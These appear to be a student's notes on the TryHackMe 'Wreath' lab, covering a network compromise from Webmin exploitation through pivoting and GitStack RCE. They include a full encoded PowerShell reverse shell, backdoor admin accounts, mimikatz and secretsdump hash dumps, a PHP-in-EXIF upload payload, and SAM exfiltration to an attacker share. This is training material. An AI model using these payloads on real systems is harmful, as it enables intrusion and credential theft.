link: https://tryhackme.com/room/wreath
<code><h2>Enumaration PublicFacing Webserver </h2>
┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ nmap -sV -sC -Pn 10.200.85.200
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-24 05:31 CST
Nmap scan report for 10.200.85.200
Host is up (0.53s latency).
Not shown: 920 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-01-24T10:54:15
|_Not valid after:  2025-01-23T10:54:15
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds

<b>Service Webmin is vulnarable</b>
link: https://github.com/MuirlandOracle/CVE-2019-15107

use exploit to get reverse shell

<b>download /root/.ssh/id_rsa to get pernament access via ssh</b>

┌──(duke㉿kali) [/Documents/THM_Wreath]
└─$ cp id_rsa root                        
┌──(duke㉿kali) [/Documents/THM_Wreath]
└─$ chmod +600 root 
┌──(duke㉿kali) [/Documents/THM_Wreath]
└─$ ssh -i root root@10.200.85.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@prod-serv ~]# 

<h2>Enumaration/Pivoting </h2>
run linpeas
╔══════════╣ Mails (limit 50)
 13718632      0 -rw-rw----   1  twreath  mail            0 Nov  7  2020 /var/mail/twreath                          
 12674676      0 -rw-rw----   1  dheenaxe mail            0 Jan 25 07:58 /var/mail/dheenaxe
 13718632      0 -rw-rw----   1  twreath  mail            0 Nov  7  2020 /var/spool/mail/twreath
 12674676      0 -rw-rw----   1  dheenaxe mail            0 Jan 25 07:58 /var/spool/mail/dheenaxe

 [root@prod-serv ~]# netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:hostmon         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ndmp            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0     36 ip-10-200-85-200.eu:ssh ip-10-50-86-201.e:52266 ESTABLISHED
tcp        1      0 ip-10-200-85-200.e:ndmp ip-10-50-86-177.e:50390 CLOSE_WAIT 
tcp        0      0 ip-10-200-85-200.:52180 ip-10-50-8:search-agent ESTABLISHED
tcp        0      0 ip-10-200-85-200.:56776 ip-10-50-86-177.e:https ESTABLISHED
tcp        1      0 ip-10-200-85-200.e:ndmp ip-10-50-86-231.e:58264 CLOSE_WAIT 

[root@prod-serv ~]# arp -a
ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150) at 02:1a:65:6e:5d:1f [ether] on eth0
ip-10-200-85-100.eu-west-1.compute.internal (10.200.85.100) at 02:35:7b:8f:3a:af [ether] on eth0
ip-10-200-85-1.eu-west-1.compute.internal (10.200.85.1) at 02:16:e7:43:1c:11 [ether] on eth0

[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
64 bytes from 10.200.85.1: icmp_seq=1 ttl=255 time=0.293 ms
64 bytes from 10.200.85.200: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 10.200.85.250: icmp_seq=1 ttl=64 time=0.574 ms

[root@prod-serv tmp]# ./nmap-dukeofnero -sP 10.200.85.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-01-29 09:39 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-85-1.eu-west-1.compute.internal (10.200.85.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.15s latency).
MAC Address: 02:16:E7:43:1C:11 (Unknown)
Nmap scan report for ip-10-200-85-100.eu-west-1.compute.internal (10.200.85.100)
Host is up (0.00047s latency).
MAC Address: 02:E4:55:CA:F3:1B (Unknown)
Nmap scan report for ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150)
Host is up (0.00046s latency).
MAC Address: 02:E9:87:C5:9E:21 (Unknown)
Nmap scan report for ip-10-200-85-250.eu-west-1.compute.internal (10.200.85.250)
Host is up (0.00032s latency).
MAC Address: 02:C4:B2:A9:1F:37 (Unknown)
Nmap scan report for ip-10-200-85-200.eu-west-1.compute.internal (10.200.85.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.78 seconds

[root@prod-serv tmp]# ./nmap-dukeofnero  10.200.85.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-01-29 09:40 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.42% done; ETC: 09:42 (0:00:04 remaining)
Nmap scan report for ip-10-200-85-100.eu-west-1.compute.internal (10.200.85.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 6150 scanned ports on ip-10-200-85-100.eu-west-1.compute.internal (10.200.85.100) are filtered
MAC Address: 02:E4:55:CA:F3:1B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.55 seconds
[root@prod-serv tmp]# ./nmap-dukeofnero  10.200.85.150
Host is up (0.00056s latency).
Not shown: 6146 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:E9:87:C5:9E:21 (Unknown)

<h2> Port forwarding </h2>
┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ ssh -L 23456:10.200.85.150:80  -i root root@10.200.85.200 -N

or using socat 

┌──(duke㉿kali)-[~]
└─$ socat tcp-l:18801 tcp-l:18800,fork,reuseaddr
[root@prod-serv tmp]# ./socat-dukeofnero tcp:10.50.86.201:18801 tcp:10.200.85.150:80,fork &

<h2>Task 20  Git Server Exploitation </h2>

On 10.200.85.200 PublicFacing Webserver run listener
[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 23456/tcp
success
[root@prod-serv tmp]# nc -lvnp 23456

via Python RCE exploit for version 2.3.10 gitstack send exploit and reverse shell (43777.py)

Burp suit send revershell
POST /web/exploit-duke.php HTTP/1.1
Host: 127.0.0.1:23455
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0
Accept: text/html,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 816

a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.85.200%27%2C23456%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

<h2>Task 21  Git Server Stabilisation & Post Exploitation</h2> 
PS C:\GitStack\gitphp> net user duke ***** /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators duke /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" duke /add
The command completed successfully.

Set portforwarding for RDP service

┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ ssh -L 33389:10.200.85.150:3389  -i root root@10.200.85.200 -N

use remina 127.0.0.1:33389

copy and run mimikatz

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

get administrator and tomas hash

<h2>Task 33  Personal PC Enumeration </h2>

on 10.200.85.150 upload ps and run

PS C:\Users\duke\Documents> Invoke-Portscan -Hosts 10.200.85.100 -TopPorts 50


Hostname      : 10.200.85.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 21, 23...}
finishTime    : 30/01/2024 10:32:15

<h2>Task 34  Personal PC Pivoting </h2>

## chisel 10.200.85.150 18001/Socks5 -> ssh 10.200.85.200 18002/ssh -> ssh/chisel localhost/proxy 9090/socks5

## On 10.200.85.150 run
C:\Users\duke\Documents>netsh advfirewall firewall add rule name="duke2-MuirlandOracle" dir=in action=allow protocol=tcp localport=18001
Ok.

C:\Users\duke\Documents>.\chisel_1.9.1_win_amd64.exe server -p 18001 --socks5
2024/01/31 09:23:00 server: Fingerprint X8owjaSez45pbyQA6djOuW72epShkSPuoYe27otyDzI=
2024/01/31 09:23:00 server: Listening on http://0.0.0.0:18001
2024/01/31 09:48:52 server: session#1: Client version (1.9.1-0kali1) differs from server version (1.9.1)

## On Kali 

┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ ssh -L 18002:10.200.85.150:18001  -i root root@10.200.85.200 -N 
and
┌──(duke㉿kali)-[~]
└─$ chisel client 127.0.0.1:18002 9090:socks
2024/01/31 03:48:52 client: Connecting to ws://127.0.0.1:18002

<h2>Task 37  Personal PC Exploit PoC </h2>

└─$ exiftool test-duke.jpeg.php 
ExifTool Version Number         : 12.57
File Name                       : test-duke.jpeg.php
Directory                       : .
File Size                       : 178 kB
File Modification Date/Time     : 2023:03:20 03:46:15-05:00
File Access Date/Time           : 2024:01:31 04:33:59-06:00
File Inode Change Date/Time     : 2024:01:31 04:34:17-06:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1181
Image Height                    : 665
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1181x665
Megapixels                      : 0.785
                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-duke.jpeg.php 
    1 image files updated
                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ exiftool test-duke.jpeg.php                                                             
ExifTool Version Number         : 12.57
File Name                       : test-duke.jpeg.php
Directory                       : .
File Size                       : 178 kB
File Modification Date/Time     : 2024:01:31 04:35:21-06:00
File Access Date/Time           : 2024:01:31 04:35:21-06:00
File Inode Change Date/Time     : 2024:01:31 04:35:21-06:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
Image Width                     : 1181
Image Height                    : 665
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1181x665
Megapixels                      : 0.785

/resources
usr:thomas
psw:i<3ruby

exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php

### load
/resources/uploads/test-USERNAME.jpeg.php
vhups

<h2>Task 42  AV Evasion Enumeration </h2>

### C:\xampp\htdocs\resources\uploads>whoami
wreath-pc\thomas

### C:\xampp\htdocs\resources\uploads>whoami /priv

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

### C:\xampp\htdocs\resources\uploads>whoami /groups
GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   

### C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
LSM                                                                                 LSM                                                                                                                                   Unknown    
Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     


### C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

### C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)


<h2> Task 44  Exfiltration Exfiltration Techniques & Post Exploitation </h2>

Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:
### reg.exe save HKLM\SYSTEM system.bak

With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.

It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the net use command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:

### reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak

┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak local
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up... 


</code>
